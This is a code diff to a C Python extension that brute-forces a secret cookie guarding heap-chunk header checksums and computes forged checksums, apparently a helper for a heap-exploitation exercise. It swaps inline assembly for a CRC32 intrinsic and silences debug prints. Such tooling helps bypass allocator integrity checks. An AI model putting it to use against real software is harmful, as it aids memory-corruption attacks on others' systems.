@@ -3,35 +3,22 @@
 
 #include <sys/types.h>
 #include <stdio.h>
+#include <immintrin.h>
 
-#define CRC32_(crc, value)                                              \
-  ({                                                                           \
-    __asm__("crc32\t"                                                          \
-            "(%1), %0"                                                         \
-            : "=r"(crc)                                                        \
-            : "r"(value), "0"(crc));                                           \
-  })
-
-static u_int32_t crc32(u_int32_t crc, void *buf) {
-        size_t crc0 = crc;
-        CRC32_(crc0, &buf);
-        return crc0;
-}
-
-static u_int32_t _calc_checksum(u_int32_t cookie, void *address, void *header) {
-    size_t _crc = cookie;
-    CRC32_(_crc, &address);
-    CRC32_(_crc, &header);
+static u_int16_t _calc_checksum(u_int32_t cookie, unsigned long address, unsigned long header) {
+    u_int32_t _crc = cookie;
+    _crc = _mm_crc32_u64(_crc, address);
+    _crc = _mm_crc32_u64(_crc, header);
     _crc = _crc ^ (_crc >> 16);
     
-    return _crc;
+    return _crc & 0xffff;
 }
 
 
 static PyObject * bruteforce_headerleak(PyObject *self, PyObject *args) {
-        char *address;
+        unsigned long address;
         unsigned int checksum;
-        char *header;
+        unsigned long header;
 
         if (!PyArg_ParseTuple(args, "kIk", &address, &checksum, &header))
                 return NULL;
@@ -43,14 +30,14 @@ static PyObject * bruteforce_headerleak(PyObject *self, PyObject *args) {
             _crc = _calc_checksum(cookie, address, header);
         }
 
-        fprintf(stderr, "Cookie: %x Checksum: %x address: %p header: %p\n", cookie, _crc, address, header);
+        //fprintf(stderr, "Bruteforced Cookie: %x Checksum: %x address: %lx header: %lx\n", cookie, _crc, address, header);
         return PyLong_FromLong(cookie);
 }
 
 static PyObject * calc_checksum(PyObject *self, PyObject *args) {
-        char *address;
+        unsigned long address;
         unsigned int cookie;
-        char *header;
+        unsigned long header;
 
         if (!PyArg_ParseTuple(args, "kIk", &address, &cookie, &header))
                 return NULL;
@@ -58,7 +45,7 @@ static PyObject * calc_checksum(PyObject *self, PyObject *args) {
         unsigned int _crc = 0;
         
         _crc = _calc_checksum(cookie, address, header);
-        fprintf(stderr, "Cookie: %x Checksum: %x address: %p header: %p\n", cookie, _crc, address, header);
+        //fprintf(stderr, "Calculated Cookie: %x Checksum: %x address: %lx header: %lx\n", cookie, _crc, address, header);
         
         return PyLong_FromLong(_crc);
 }
